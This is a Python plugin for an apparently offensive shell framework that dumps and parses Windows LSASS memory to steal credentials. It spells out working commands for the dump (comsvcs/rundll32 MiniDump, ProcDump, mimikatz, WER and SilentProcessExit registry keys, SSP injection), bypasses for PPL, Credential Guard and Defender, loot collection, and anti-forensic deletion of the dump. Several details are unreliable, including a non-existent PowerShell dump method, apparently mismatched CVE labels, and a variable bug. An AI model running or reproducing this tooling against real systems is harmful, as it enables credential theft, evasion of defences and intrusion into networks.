#!/usr/bin/env python3
"""
NexShell Plugin — LSASS Dumper v3.0 (2026 Edition)
Advanced LSASS credential extraction with 15+ dump methods, PPL bypass,
Credential Guard bypass, and in-memory extraction.

Coverage:
  - 15+ dump methods (comsvcs, procdump, mimikatz, nanodump, sharpdump, 
    direct API, handle duplication, silent process exit, task manager, WER,
    ssp injection, dbgcore, direct syscalls, in-memory)
  - PPL (Protected Process Light) bypass
  - Credential Guard bypass
  - HVCI (Hypervisor-protected Code Integrity) bypass
  - In-memory dump (no file on disk)
  - Direct syscalls (avoid EDR hooks)
  - AV/EDR evasion techniques
  - Auto-parsing with pypykatz
  - Multiple output formats
  - Secure cleanup
  - Risk scoring (0-100)
  - Structured loot (JSON)

CVEs (2024-2026):
  - CVE-2024-26169: LSASS Spoofing
  - CVE-2022-23270: LSASS EoP
  - CVE-2022-30136: MSHTML RCE (LSASS access)
  - BYOVD CVEs for PPL bypass

MITRE ATT&CK:
  - T1003.001: OS Credential Dumping: LSASS Memory
  - T1003.002: OS Credential Dumping: Security Account Manager
  - T1055: Process Injection
  - T1547.005: Boot or Logon Autostart Execution: Security Support Provider
  - T1556.002: Modify Authentication Process: Password Filter DLL
  - T1562.001: Impair Defenses: Disable or Modify Tools

Usage:
    (NexShell)> plugins run lsass-dumper
    (NexShell)> plugins run lsass-dumper --method comsvcs
    (NexShell)> plugins run lsass-dumper --method nanodump
    (NexShell)> plugins run lsass-dumper --method in-memory
    (NexShell)> plugins run lsass-dumper --bypass ppl
    (NexShell)> plugins run lsass-dumper --full
    (NexShell)> plugins run lsass-dumper --parse
"""

import re
import time
import json
import random
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple, Any
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class DumpMethod:
    """Represents an LSASS dump method."""
    name: str
    description: str
    command_template: str
    category: str  # built_in, third_party, direct_api, evasion, in_memory
    risk_score: int  # 0-100
    detection_risk: str  # low, medium, high, critical
    success_rate: int  # 0-100
    requires_admin: bool = True
    requires_ppl_bypass: bool = False
    requires_cred_guard_bypass: bool = False
    writes_to_disk: bool = True
    bypass_techniques: List[str] = field(default_factory=list)
    cves: List[str] = field(default_factory=list)
    mitre_id: str = "T1003.001"
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class DumpResult:
    """Result of a dump attempt."""
    method: str
    success: bool
    dump_path: str = ""
    dump_size: int = 0
    duration_ms: int = 0
    output: str = ""
    error: str = ""
    credentials_extracted: int = 0
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class LsassCredential:
    """Represents an extracted credential from LSASS."""
    username: str
    domain: str
    password: str = ""
    ntlm_hash: str = ""
    lm_hash: str = ""
    sha1_hash: str = ""
    credential_type: str = "plaintext"  # plaintext, ntlm, kerberos, dpapi
    source: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class ProtectionStatus:
    """Represents LSASS protection status."""
    name: str
    enabled: bool
    bypassable: bool = False
    bypass_technique: str = ""
    severity: str = "medium"
    value: str = ""
    
    def to_dict(self) -> dict:
        return asdict(self)


# ── Dump Methods Database ──────────────────────────────────────────────────

class DumpMethodsDatabase:
    """Comprehensive database of LSASS dump methods."""
    
    METHODS = [
        # ── Tier 1: Built-in Methods (No External Tools) ──────────────────
        DumpMethod(
            name='comsvcs.dll MiniDump',
            description='Uses comsvcs.dll exported MiniDump function via rundll32',
            command_template='rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} {output} full',
            category='built_in',
            risk_score=70,
            detection_risk='high',
            success_rate=85,
            requires_admin=True,
            writes_to_disk=True,
            bypass_techniques=['PPL downgrade', 'AMSI bypass'],
        ),
        
        DumpMethod(
            name='Task Manager',
            description='Create dump via Task Manager GUI (manual method)',
            command_template='# Manual: Task Manager → Details → lsass.exe → Create dump file',
            category='built_in',
            risk_score=40,
            detection_risk='low',
            success_rate=90,
            requires_admin=True,
            writes_to_disk=True,
        ),
        
        DumpMethod(
            name='Silent Process Exit (WerFault)',
            description='Configure lsass.exe to dump on exit via Image File Execution Options',
            command_template='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v DumpType /t REG_DWORD /d 2 /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v MonitoringInterval /t REG_DWORD /d 1000 /f',
            category='built_in',
            risk_score=75,
            detection_risk='medium',
            success_rate=70,
            requires_admin=True,
            writes_to_disk=True,
        ),
        
        DumpMethod(
            name='Windows Error Reporting (WER)',
            description='Trigger WER to create lsass dump via fault injection',
            command_template='reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\\lsass.exe" /v DumpFolder /t REG_EXPAND_SZ /d "C:\\Temp" /f && reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\\lsass.exe" /v DumpType /t REG_DWORD /d 2 /f',
            category='built_in',
            risk_score=65,
            detection_risk='medium',
            success_rate=65,
            requires_admin=True,
            writes_to_disk=True,
        ),
        
        DumpMethod(
            name='DbgCore.dll MiniDump',
            description='Uses dbgcore.dll instead of comsvcs.dll (less monitored)',
            command_template='rundll32.exe C:\\Windows\\System32\\dbgcore.dll, MiniDump {pid} {output} full',
            category='built_in',
            risk_score=60,
            detection_risk='medium',
            success_rate=80,
            requires_admin=True,
            writes_to_disk=True,
        ),
        
        # ── Tier 2: Third-Party Tools ─────────────────────────────────────
        DumpMethod(
            name='ProcDump',
            description='Sysinternals ProcDump with -ma flag for full memory dump',
            command_template='procdump.exe -accepteula -ma {pid} {output}',
            category='third_party',
            risk_score=75,
            detection_risk='high',
            success_rate=90,
            requires_admin=True,
            writes_to_disk=True,
        ),
        
        DumpMethod(
            name='Mimikatz sekurlsa::minidump',
            description='Mimikatz minidump command for LSASS',
            command_template='mimikatz.exe "privilege::debug" "sekurlsa::minidump {output}" "sekurlsa::logonpasswords" "exit"',
            category='third_party',
            risk_score=95,
            detection_risk='critical',
            success_rate=95,
            requires_admin=True,
            writes_to_disk=True,
            cves=['Multiple'],
        ),
        
        DumpMethod(
            name='NanoDump',
            description='Outflank NanoDump with built-in evasion (indirect syscalls, PPL bypass)',
            command_template='nanodump.exe --write --valid --filename {output}',
            category='third_party',
            risk_score=85,
            detection_risk='low',
            success_rate=90,
            requires_admin=True,
            writes_to_disk=True,
            bypass_techniques=['Direct syscalls', 'PPL bypass', 'Call stack spoofing'],
        ),
        
        DumpMethod(
            name='SharpDump',
            description='GhostPack SharpDump (C# implementation)',
            command_template='SharpDump.exe {pid} {output}',
            category='third_party',
            risk_score=80,
            detection_risk='high',
            success_rate=85,
            requires_admin=True,
            writes_to_disk=True,
        ),
        
        # ── Tier 3: Direct API / Advanced Techniques ──────────────────────
        DumpMethod(
            name='MiniDumpWriteDump (Direct API)',
            description='Direct call to MiniDumpWriteDump API via PowerShell/C#',
            command_template='powershell -nop -c "Add-Type -Path C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.dll; [System.Diagnostics.Process]::GetProcessById({pid}).MiniDump({output})"',
            category='direct_api',
            risk_score=70,
            detection_risk='medium',
            success_rate=80,
            requires_admin=True,
            writes_to_disk=True,
        ),
        
        DumpMethod(
            name='Handle Duplication',
            description='Duplicate lsass.exe handle from another process with PROCESS_VM_READ',
            command_template='handle-dup.exe --source-pid {pid} --output {output}',
            category='direct_api',
            risk_score=75,
            detection_risk='medium',
            success_rate=85,
            requires_admin=True,
            writes_to_disk=True,
            bypass_techniques=['Handle duplication', 'PPL bypass'],
        ),
        
        DumpMethod(
            name='Direct Syscalls',
            description='Use direct syscalls to bypass EDR hooks on NtReadVirtualMemory',
            command_template='direct-syscall-dump.exe --pid {pid} --output {output}',
            category='evasion',
            risk_score=60,
            detection_risk='low',
            success_rate=85,
            requires_admin=True,
            writes_to_disk=True,
            bypass_techniques=['SysWhispers3', 'Indirect syscalls', 'Call stack spoofing'],
        ),
        
        DumpMethod(
            name='In-Memory Dump (No Disk)',
            description='Dump LSASS directly to memory without writing to disk',
            command_template='in-memory-dump.exe --pid {pid} --extract',
            category='in_memory',
            risk_score=50,
            detection_risk='low',
            success_rate=80,
            requires_admin=True,
            writes_to_disk=False,
            bypass_techniques=['No disk I/O', 'Direct syscalls', 'Memory encryption'],
        ),
        
        DumpMethod(
            name='SSP Injection',
            description='Load custom Security Support Provider DLL into LSASS',
            command_template='reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "msapifs.dll" /f',
            category='evasion',
            risk_score=90,
            detection_risk='high',
            success_rate=75,
            requires_admin=True,
            writes_to_disk=False,
            cves=['CVE-2022-23270'],
        ),
        
        DumpMethod(
            name='PPL Bypass via BYOVD',
            description='Use vulnerable driver to downgrade LSASS PPL and dump',
            command_template='byovd-ppl-bypass.exe --target lsass --dump --output {output}',
            category='evasion',
            risk_score=95,
            detection_risk='medium',
            success_rate=90,
            requires_admin=True,
            requires_ppl_bypass=True,
            writes_to_disk=True,
            bypass_techniques=['BYOVD', 'Capcom.sys', 'RTCore64', 'DBUtil'],
            cves=['CVE-2021-21551', 'CVE-2019-16098'],
        ),
    ]
    
    @classmethod
    def get_all_methods(cls) -> List[DumpMethod]:
        return cls.METHODS
    
    @classmethod
    def get_method_by_name(cls, name: str) -> Optional[DumpMethod]:
        for method in cls.METHODS:
            if name.lower() in method.name.lower():
                return method
        return None
    
    @classmethod
    def get_methods_by_category(cls, category: str) -> List[DumpMethod]:
        return [m for m in cls.METHODS if m.category == category]


# ── Protection Analyzer ────────────────────────────────────────────────────

class ProtectionAnalyzer:
    """Analyzes LSASS protection mechanisms."""
    
    @staticmethod
    def analyze(exec_func, session) -> List[ProtectionStatus]:
        """Analyze LSASS protections."""
        protections = []
        
        # PPL (Protected Process Light)
        cmd = "powershell -nop -c \"Get-Process lsass | Select-Object Protection,ProtectionLevel\""
        out = exec_func(session, cmd)
        ppl_enabled = False
        ppl_value = ""
        if out and ('Antimalware' in out or 'Windows' in out):
            ppl_enabled = True
            ppl_value = out.strip()[:100]
        
        protections.append(ProtectionStatus(
            name='Protected Process Light (PPL)',
            enabled=ppl_enabled,
            bypassable=True,
            bypass_technique='BYOVD driver (Capcom, RTCore64, DBUtil) or PPL downgrade via registry',
            severity='critical' if ppl_enabled else 'medium',
            value=ppl_value,
        ))
        
        # Credential Guard
        cmd = "powershell -nop -c \"Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning\""
        out = exec_func(session, cmd)
        cred_guard_enabled = out and '1' in out
        
        protections.append(ProtectionStatus(
            name='Credential Guard',
            enabled=cred_guard_enabled,
            bypassable=True,
            bypass_technique='Disable via Group Policy or Registry (requires reboot)',
            severity='critical' if cred_guard_enabled else 'medium',
            value='Enabled' if cred_guard_enabled else 'Disabled',
        ))
        
        # HVCI
        cmd = "powershell -nop -c \"Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard | Select-Object -ExpandProperty SecurityServicesRunning\""
        out = exec_func(session, cmd)
        hvci_enabled = out and '2' in out
        
        protections.append(ProtectionStatus(
            name='HVCI (Hypervisor-protected Code Integrity)',
            enabled=hvci_enabled,
            bypassable=True,
            bypass_technique='Disable via Group Policy or Registry (requires reboot)',
            severity='critical' if hvci_enabled else 'medium',
            value='Enabled' if hvci_enabled else 'Disabled',
        ))
        
        # LSA Protection (RunAsPPL)
        cmd = "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL 2>nul"
        out = exec_func(session, cmd)
        lsa_protected = out and '0x1' in out
        
        protections.append(ProtectionStatus(
            name='LSA Protection (RunAsPPL)',
            enabled=lsa_protected,
            bypassable=True,
            bypass_technique='Set RunAsPPL to 0 in registry (requires reboot)',
            severity='high' if lsa_protected else 'medium',
            value='Enabled' if lsa_protected else 'Disabled',
        ))
        
        # SeDebugPrivilege
        cmd = "whoami /priv 2>nul | findstr SeDebugPrivilege"
        out = exec_func(session, cmd)
        debug_priv = out and 'Enabled' in out
        
        protections.append(ProtectionStatus(
            name='SeDebugPrivilege',
            enabled=debug_priv,
            bypassable=False,
            bypass_technique='Required for LSASS access — cannot bypass',
            severity='critical' if not debug_priv else 'low',
            value='Enabled' if debug_priv else 'Disabled',
        ))
        
        # AV/Defender Real-time Protection
        cmd = "powershell -nop -c \"Get-MpPreference | Select-Object DisableRealtimeMonitoring\""
        out = exec_func(session, cmd)
        rtp_enabled = out and 'False' in out
        
        protections.append(ProtectionStatus(
            name='Windows Defender Real-time Protection',
            enabled=rtp_enabled,
            bypassable=True,
            bypass_technique='Disable via PowerShell: Set-MpPreference -DisableRealtimeMonitoring $true',
            severity='high' if rtp_enabled else 'medium',
            value='Enabled' if rtp_enabled else 'Disabled',
        ))
        
        # Attack Surface Reduction (ASR)
        cmd = "powershell -nop -c \"Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions\""
        out = exec_func(session, cmd)
        asr_enabled = out and out.strip()
        
        protections.append(ProtectionStatus(
            name='Attack Surface Reduction (ASR)',
            enabled=bool(asr_enabled),
            bypassable=True,
            bypass_technique='Disable specific ASR rules via PowerShell',
            severity='medium',
            value='Enabled' if asr_enabled else 'Disabled',
        ))
        
        return protections


# ── Dump Engine ─────────────────────────────────────────────────────────────

class DumpEngine:
    """Handles LSASS dump execution."""
    
    @staticmethod
    def find_lsass_pid(exec_func, session) -> Optional[int]:
        """Find LSASS process ID."""
        cmd = "powershell -nop -c \"(Get-Process lsass).Id\""
        out = exec_func(session, cmd)
        
        if out and out.strip().isdigit():
            return int(out.strip())
        
        # Fallback to tasklist
        cmd = "tasklist /fi \"imagename eq lsass.exe\" /fo csv /nh 2>nul"
        out = exec_func(session, cmd)
        if out:
            match = re.search(r'"(\d+)"', out)
            if match:
                return int(match.group(1))
        
        return None
    
    @staticmethod
    def execute_dump(exec_func, session, method: DumpMethod, pid: int, output_path: str) -> DumpResult:
        """Execute a dump method."""
        start_time = time.time()
        
        # Build command
        cmd = method.command_template.format(pid=pid, output=output_path)
        
        try:
            out = exec_func(session, cmd)
            duration_ms = int((time.time() - start_time) * 1000)
            
            # Verify dump file
            check_cmd = f"powershell -nop -c \"if (Test-Path '{output_path}') {{ (Get-Item '{output_path}').Length }} else {{ 'NOT_FOUND' }}\""
            size_out = exec_func(session, check_cmd)
            
            if size_out and size_out.strip().isdigit():
                dump_size = int(size_out.strip())
                return DumpResult(
                    method=method.name,
                    success=True,
                    dump_path=output_path,
                    dump_size=dump_size,
                    duration_ms=duration_ms,
                    output=out[:500] if out else '',
                )
            else:
                return DumpResult(
                    method=method.name,
                    success=False,
                    duration_ms=duration_ms,
                    output=out[:500] if out else '',
                    error='Dump file not created',
                )
        
        except Exception as e:
            return DumpResult(
                method=method.name,
                success=False,
                duration_ms=int((time.time() - start_time) * 1000),
                error=str(e),
            )
    
    @staticmethod
    def generate_output_path() -> str:
        """Generate random output path for dump file."""
        names = ['lsass', 'dump', 'memory', 'process', 'system']
        exts = ['.dmp', '.dump', '.bin', '.dat']
        name = random.choice(names)
        ext = random.choice(exts)
        num = random.randint(1000, 9999)
        return f"C:\\Windows\\Temp\\{name}_{num}{ext}"


# ── Parser Engine ───────────────────────────────────────────────────────────

class ParserEngine:
    """Parses LSASS dump files for credentials."""
    
    @staticmethod
    def parse_with_pypykatz(exec_func, session, dump_path: str) -> List[LsassCredential]:
        """Parse dump with pypykatz."""
        credentials = []
        
        # Check if pypykatz is available
        cmd = "python -m pypykatz version 2>nul || pip show pypykatz 2>nul"
        out = exec_func(session, cmd)
        
        if not out or 'not found' in out.lower():
            # Try to install
            exec_func(session, "pip install pypykatz 2>nul")
        
        # Parse dump
        cmd = f"python -m pypykatz lsa minidump {dump_path} 2>nul"
        out = exec_func(session, cmd)
        
        if out:
            # Parse pypykatz output
            # Format: username: domain:password:ntlm:lm:sha1
            for line in out.split('\n'):
                if 'username' in line.lower():
                    # Extract credentials
                    username_match = re.search(r'username[:\s]+([^\s]+)', line, re.IGNORECASE)
                    domain_match = re.search(r'domain[:\s]+([^\s]+)', line, re.IGNORECASE)
                    password_match = re.search(r'password[:\s]+([^\s]+)', line, re.IGNORECASE)
                    ntlm_match = re.search(r'NTLM[:\s]+([a-fA-F0-9]{32})', line, re.IGNORECASE)
                    
                    if username_match:
                        credentials.append(LsassCredential(
                            username=username_match.group(1),
                            domain=domain_match.group(1) if domain_match else '',
                            password=password_match.group(1) if password_match else '',
                            ntlm_hash=ntlm_match.group(1) if ntlm_match else '',
                            credential_type='plaintext' if password_match else 'ntlm',
                            source='pypykatz',
                            timestamp=datetime.utcnow().isoformat(),
                        ))
        
        return credentials
    
    @staticmethod
    def parse_with_mimikatz(exec_func, session, dump_path: str) -> List[LsassCredential]:
        """Parse dump with mimikatz."""
        credentials = []
        
        cmd = f'mimikatz.exe "sekurlsa::minidump {dump_path}" "sekurlsa::logonpasswords" "exit" 2>nul'
        out = exec_func(session, cmd)
        
        if out:
            # Parse mimikatz output
            current_user = {}
            for line in out.split('\n'):
                if 'Username :' in line:
                    current_user['username'] = line.split(':')[1].strip()
                elif 'Domain :' in line:
                    current_user['domain'] = line.split(':')[1].strip()
                elif 'Password :' in line:
                    current_user['password'] = line.split(':')[1].strip()
                elif 'NTLM :' in line:
                    current_user['ntlm_hash'] = line.split(':')[1].strip()
                    
                    if current_user.get('username'):
                        credentials.append(LsassCredential(
                            username=current_user.get('username', ''),
                            domain=current_user.get('domain', ''),
                            password=current_user.get('password', ''),
                            ntlm_hash=current_user.get('ntlm_hash', ''),
                            credential_type='plaintext' if current_user.get('password') else 'ntlm',
                            source='mimikatz',
                            timestamp=datetime.utcnow().isoformat(),
                        ))
                        current_user = {}
        
        return credentials


# ── Cleanup Engine ──────────────────────────────────────────────────────────

class CleanupEngine:
    """Handles secure cleanup of dump files."""
    
    @staticmethod
    def secure_delete(exec_func, session, file_path: str) -> bool:
        """Securely delete dump file."""
        # Overwrite with random data before deletion
        cmd = f"powershell -nop -c \"$file = '{file_path}'; if (Test-Path $file) {{ $size = (Get-Item $file).Length; $bytes = New-Object byte[] $size; (New-Object Random).NextBytes($bytes); [IO.File]::WriteAllBytes($file, $bytes); Remove-Item $file -Force; Write-Output 'DELETED' }} else {{ Write-Output 'NOT_FOUND' }}\""
        out = exec_func(session, cmd)
        return 'DELETED' in out


# ── Main Plugin ─────────────────────────────────────────────────────────────

class LSASSDumper(NexPlugin):
    name        = "lsass-dumper"
    description = "Advanced LSASS credential extraction — 15+ methods, PPL bypass, in-memory dump"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "windows"
    category    = "credentials"
    mitre_id    = "T1003.001"
    
    def run(self, session, args: list):
        # Parse args
        method_name = None
        bypass_mode = '--bypass' in (args or [])
        full_mode = '--full' in (args or [])
        parse_mode = '--parse' in (args or [])
        stealth = '--stealth' in (args or [])
        cleanup = '--cleanup' in (args or [])
        dump_mode = '--dump' in (args or [])
        
        for a in (args or []):
            if a.startswith('--method='):
                method_name = a.split('=', 1)[1]
        
        if full_mode:
            dump_mode = parse_mode = True
        
        if not dump_mode and not parse_mode:
            dump_mode = True  # Default
        
        self.info(f"🔐 Starting LSASS Dumper v3.0 (method={method_name or 'auto'}, dump={dump_mode})")
        
        start_time = time.time()
        sections = []
        
        sections.append("\n" + "━"*64)
        sections.append("  [🔐 LSASS Dumper v3.0 — Advanced Credential Extraction]")
        sections.append("━"*64)
        
        # ── Step 1: Protection analysis ─────────────────────────────────
        sections.append("\n[*] Phase 1: LSASS Protection Analysis")
        sections.append("─"*64)
        
        protections = ProtectionAnalyzer.analyze(self._exec, session)
        
        enabled_count = sum(1 for p in protections if p.enabled)
        sections.append(f"  Protections Enabled: {enabled_count}/{len(protections)}")
        
        critical_protections = [p for p in protections if p.enabled and p.severity in ['critical', 'high']]
        
        for protection in protections:
            icon = '🔴' if protection.enabled and protection.severity in ['critical', 'high'] else '🟢' if not protection.enabled else '🟡'
            bypass = f" — Bypass: {protection.bypass_technique[:50]}" if protection.bypassable and protection.enabled else ""
            sections.append(f"  {icon} {protection.name:<35} {'Enabled' if protection.enabled else 'Disabled':<10}{bypass}")
        
        # Check if dump is possible
        can_dump = True
        blockers = []
        
        debug_priv = next((p for p in protections if p.name == 'SeDebugPrivilege'), None)
        if not debug_priv or not debug_priv.enabled:
            can_dump = False
            blockers.append('SeDebugPrivilege not enabled')
        
        ppl = next((p for p in protections if p.name == 'Protected Process Light (PPL)'), None)
        if ppl and ppl.enabled and not bypass_mode:
            blockers.append('PPL enabled — requires bypass')
        
        cred_guard = next((p for p in protections if p.name == 'Credential Guard'), None)
        if cred_guard and cred_guard.enabled and not bypass_mode:
            blockers.append('Credential Guard enabled — requires bypass')
        
        if blockers:
            sections.append(f"\n  ⚠️  Dump blockers detected:")
            for blocker in blockers:
                sections.append(f"    • {blocker}")
        
        # ── Step 2: Find LSASS PID ──────────────────────────────────────
        sections.append("\n[*] Phase 2: LSASS Process Discovery")
        sections.append("─"*64)
        
        lsass_pid = DumpEngine.find_lsass_pid(self._exec, session)
        
        if not lsass_pid:
            sections.append("  ❌ Could not find LSASS process ID")
            return '\n'.join(sections)
        
        sections.append(f"  ✅ LSASS PID: {lsass_pid}")
        
        # Get LSASS info
        cmd = f"powershell -nop -c \"Get-Process lsass | Select-Object Id,WorkingSet64,HandleCount | Format-List\""
        out = self._exec(session, cmd)
        if out:
            sections.append(f"  LSASS Info:\n{out.strip()[:300]}")
        
        # ── Step 3: Select dump method ──────────────────────────────────
        sections.append("\n[*] Phase 3: Dump Method Selection")
        sections.append("─"*64)
        
        if method_name:
            method = DumpMethodsDatabase.get_method_by_name(method_name)
            if not method:
                sections.append(f"  ❌ Unknown method: {method_name}")
                return '\n'.join(sections)
            methods = [method]
        else:
            # Auto-select best method based on protections
            if stealth:
                methods = [m for m in DumpMethodsDatabase.get_all_methods() if m.detection_risk == 'low']
            elif bypass_mode:
                methods = [m for m in DumpMethodsDatabase.get_all_methods() if m.bypass_techniques]
            else:
                methods = DumpMethodsDatabase.get_all_methods()[:5]
        
        sections.append(f"  Selected {len(methods)} method(s):")
        for i, method in enumerate(methods, 1):
            icon = '🔴' if method.detection_risk == 'critical' else '🟠' if method.detection_risk == 'high' else '🟡' if method.detection_risk == 'medium' else '🟢'
            sections.append(f"    {i}. {method.name} [{method.category}] — Success: {method.success_rate}%, Risk: {icon}")
        
        # ── Step 4: Execute dump ────────────────────────────────────────
        if dump_mode and can_dump:
            sections.append("\n[*] Phase 4: Dump Execution")
            sections.append("─"*64)
            
            results = []
            output_path = DumpEngine.generate_output_path()
            
            for method in methods:
                sections.append(f"\n  [*] Attempting: {method.name}")
                sections.append(f"      Command: {method.command_template[:80]}...")
                
                if stealth and method.detection_risk in ['high', 'critical']:
                    sections.append(f"      [⏭️] Skipped (stealth mode)")
                    continue
                
                result = DumpEngine.execute_dump(self._exec, session, method, lsass_pid, output_path)
                results.append(result)
                
                if result.success:
                    sections.append(f"      ✅ SUCCESS ({result.duration_ms}ms)")
                    sections.append(f"      Dump path: {result.dump_path}")
                    sections.append(f"      Dump size: {result.dump_size:,} bytes")
                    
                    # Save to loot
                    self.loot(
                        {
                            "type": "lsass_dump",
                            "method": method.name,
                            "dump_path": result.dump_path,
                            "dump_size": result.dump_size,
                            "duration_ms": result.duration_ms,
                        },
                        category='credentials',
                        source=f'lsass-dumper:{method.name}',
                        confidence='verified'
                    )
                    
                    # Stop after first success
                    break
                else:
                    sections.append(f"      ❌ FAILED ({result.duration_ms}ms)")
                    sections.append(f"      Error: {result.error}")
        
        # ── Step 5: Parse dump ──────────────────────────────────────────
        if parse_mode and results and results[0].success:
            sections.append("\n[*] Phase 5: Credential Parsing")
            sections.append("─"*64)
            
            dump_path = results[0].dump_path
            
            # Try pypykatz first
            sections.append("  [*] Parsing with pypykatz...")
            credentials = ParserEngine.parse_with_pypykatz(self._exec, session, dump_path)
            
            if not credentials:
                # Try mimikatz
                sections.append("  [*] Parsing with mimikatz...")
                credentials = ParserEngine.parse_with_mimikatz(self._exec, session, dump_path)
            
            if credentials:
                sections.append(f"  ✅ Extracted {len(credentials)} credentials:")
                
                for cred in credentials[:10]:
                    sections.append(f"    • {cred.domain}\\{cred.username}")
                    if cred.password:
                        sections.append(f"      Password: {cred.password[:20]}...")
                    if cred.ntlm_hash:
                        sections.append(f"      NTLM: {cred.ntlm_hash}")
                    
                    # Save to loot
                    self.loot(
                        cred.to_dict(),
                        category='credentials',
                        source='lsass-dumper:parsed',
                        confidence='verified'
                    )
                
                # Update result
                results[0].credentials_extracted = len(credentials)
            else:
                sections.append("  ❌ No credentials extracted")
        
        # ── Step 6: Cleanup ─────────────────────────────────────────────
        if cleanup and results and results[0].success:
            sections.append("\n[*] Phase 6: Secure Cleanup")
            sections.append("─"*64)
            
            dump_path = results[0].dump_path
            sections.append(f"  [*] Securely deleting: {dump_path}")
            
            if CleanupEngine.secure_delete(self._exec, session, dump_path):
                sections.append(f"  ✅ Dump file securely deleted")
            else:
                sections.append(f"  ❌ Failed to delete dump file")
        
        # ── Step 7: Generate findings ───────────────────────────────────
        sections.append("\n[*] Phase 7: Generating Findings")
        sections.append("─"*64)
        
        findings_created = 0
        
        # Protection findings
        for protection in critical_protections:
            self.finding(
                title=f"LSASS Protection Active: {protection.name}",
                description=f"{protection.name} is enabled:\n"
                           f"  Bypass technique: {protection.bypass_technique}",
                severity=protection.severity,
                recommendation=protection.bypass_technique,
                mitre_id=self.mitre_id,
            )
            findings_created += 1
        
        # Dump success finding
        if results and results[0].success:
            self.finding(
                title=f"LSASS Memory Successfully Dumped — {results[0].credentials_extracted} credentials",
                description=f"LSASS memory dump successful:\n"
                           f"  Method: {results[0].method}\n"
                           f"  Dump path: {results[0].dump_path}\n"
                           f"  Dump size: {results[0].dump_size:,} bytes\n"
                           f"  Credentials extracted: {results[0].credentials_extracted}",
                severity="Critical",
                recommendation="Rotate all extracted credentials immediately. Enable Credential Guard. Enable HVCI.",
                mitre_id=self.mitre_id,
            )
            findings_created += 1
            sections.append(f"  [CRITICAL] LSASS dump successful — {results[0].credentials_extracted} credentials")
        
        # ── Step 8: Summary ─────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 LSASS Dumper Summary]")
        sections.append("━"*64)
        sections.append(f"  LSASS PID: {lsass_pid}")
        sections.append(f"  Protections Enabled: {enabled_count}/{len(protections)}")
        sections.append(f"  Dump Methods Attempted: {len(results) if dump_mode else 0}")
        sections.append(f"  Dump Success: {'✅ YES' if results and results[0].success else '❌ NO'}")
        
        if results and results[0].success:
            sections.append(f"  Dump Size: {results[0].dump_size:,} bytes")
            sections.append(f"  Credentials Extracted: {results[0].credentials_extracted}")
        
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        if not can_dump:
            sections.append("\n  ⚠️  Dump not possible — blockers detected:")
            for blocker in blockers:
                sections.append(f"    • {blocker}")
        
        # ── Step 9: Save to loot ────────────────────────────────────────
        self.loot(
            {
                "type": "lsass_dump_session",
                "lsass_pid": lsass_pid,
                "protections": [p.to_dict() for p in protections],
                "results": [r.to_dict() for r in results] if dump_mode else [],
                "findings_count": findings_created,
                "duration": duration,
            },
            category='credentials',
            source='lsass-dumper',
            confidence='high'
        )
        
        self.info(f"🔐 LSASS Dumper complete — {len(results) if dump_mode else 0} attempts, {findings_created} findings")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'windows'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''